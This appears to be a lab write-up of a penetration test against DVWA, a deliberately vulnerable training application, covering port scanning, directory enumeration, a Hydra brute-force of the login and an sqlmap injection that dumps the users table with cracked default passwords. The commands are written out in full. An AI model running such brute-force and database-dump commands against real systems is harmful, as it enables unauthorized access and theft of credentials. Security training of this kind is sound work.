# Reconnaissance

1.1 Nmap Scan

Objective: Identify open ports, services, and versions.

ðŸ“Œ Findings:
	â€¢	Port 80 â€“ HTTP â€“ Apache/2.4.62 (Debian)
	â€¢	Port 3306 â€“ MySQL/MariaDB
	â€¢	OS Fingerprint: Linux Debian


1.2 Gobuster Directory Enumeration

Objective: Discover hidden web directories and files.

gobuster dir -u http://<target-ip>/ -w /path/to/wordlist -o attack-scripts/gobuster_scan.txt

ðŸ“Œ Findings:
	â€¢	/dvwa/ â€“ DVWA application root
	â€¢	/dvwa/login.php â€“ Login page
	â€¢	/dvwa/config/ â€“ Config files

# Exploitation

2.1 Brute Force with Hydra

Objective: Test weak credentials on the DVWA login.

hydra -l admin -P /path/to/wordlist http://<target-ip>/dvwa/login.php -V -o attack-scripts/hydra_bruteforce.txt

ðŸ“Œ Result:
	â€¢	Valid credentials found: admin:password

2.2 SQL Injection (SQLMap)

Objective: Exploit DVWA SQL Injection vulnerability to extract database data.

sqlmap -u "http://<target-ip>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session-id>; security=low" \
  --batch --level=5 --risk=3 --dump -o attack-scripts/sqlmap_dump.txt

ðŸ“Œ Result:
	â€¢	Database Name: dvwa
	â€¢	Table Extracted: users
	â€¢	Dumped usernames and hashed passwords (some cracked: admin:password, gordonb:abc123)


#Post-Exploitation

	â€¢	Logged extracted data into attack-scripts/sqlmap_dump.txt
	â€¢	Captured screenshots of SQLMap output and DVWA vulnerable pages (IPs blurred before upload)

#Documentation & Evidence

	â€¢	Configs â†’ configs/dvwa-config.sample.php (sanitized DVWA config file)
	â€¢	Docs â†’ docs/attack-steps.md (this file)
	â€¢	Attack Scripts â†’ All tool output logs stored in attack-scripts/
	â€¢	Screenshots â†’ Stored in /screenshots with IPs and sensitive info blurred

#Lessons Learned

	â€¢	Weak passwords (password, abc123) remain a major risk in web apps.
	â€¢	Input validation failures lead directly to SQL Injection vulnerabilities.
	â€¢	Simple reconnaissance can reveal high-impact vulnerabilities in unpatched systems.
